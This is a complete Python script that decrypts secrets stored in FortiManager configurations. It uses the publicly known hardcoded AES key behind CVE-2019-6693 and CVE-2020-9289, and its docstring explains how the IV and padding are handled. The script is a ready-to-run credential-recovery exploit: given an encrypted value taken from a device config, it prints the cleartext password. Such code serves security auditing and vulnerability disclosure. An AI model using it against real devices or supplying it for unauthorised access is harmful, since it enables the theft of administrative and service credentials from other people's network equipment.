#!/usr/bin/env python3
""" Decrypt FortiManager configuration secrets

CVE-2020-9289 is linked to the same hardcoded key as for CVE-2019-6693
The only differences are:
    - the IV handling (all the 16 bytes are provided before the encrypted data from digits)
    - the last encrypted block is stripped from the output so it needs junk to be appended then removed from the cleartext
"""

from Cryptodome.Cipher import AES
import base64
import sys

key = b'Mary had a littl'

if len(sys.argv) != 2 or len(sys.argv[1]) <= 3:
    print("Please provide the encrypted secret, encoded in base64.")
    sys.exit(1)

try :
    data = base64.b64decode(sys.argv[1])
except Exception as e:
    print("Please provide the encrypted secret encoded in base64. Error: %s" % str(e))
    sys.exit(1)

iv = data[0:16]
ct = data[16:]

# pad using null bytes
elen = len(ct) % 16
if elen:
    ct += b'\x00'*(16 - elen)

try:
    cipher = AES.new(key, iv=iv, mode=AES.MODE_CBC)
    pt = cipher.decrypt(ct)
except Exception as e:
    print("AES decrypt error: %s" % str(e))
    sys.exit(1)

# remove junk (last padding bytes)
if elen:
    pt = pt[:-16]

try:
    print(pt.decode())
except:
    print(pt)
